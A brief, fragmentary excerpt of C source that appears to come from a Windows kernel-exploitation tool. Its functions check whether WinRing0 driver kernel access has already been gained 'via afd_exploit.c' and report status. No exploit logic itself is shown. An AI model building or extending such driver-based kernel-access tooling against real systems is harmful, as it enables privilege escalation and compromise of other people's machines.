...
BOOL TestWinRing0Capabilities(void) {
    // Check if WinRing0 primitive is already established via afd_exploit.c
    extern BOOL g_bWinRing0PrimitiveEstablished;
    if (g_bWinRing0PrimitiveEstablished) {
        ConsoleSuccess("WinRing0 capabilities already established and verified");
        return TRUE;
    }
    
    if (!g_bInitialized || g_hDriver == INVALID_HANDLE_VALUE) {
        ConsoleWarning("WinRing0 driver not initialized in winring0.c module");
        return FALSE;
    }
...
BOOL EstablishWinRing0KernelAccess(void) {
    ...
    extern BOOL g_bWinRing0PrimitiveEstablished;
    if (g_bWinRing0PrimitiveEstablished) {
        ConsoleSuccess("WinRing0 kernel access already established via afd_exploit.c");
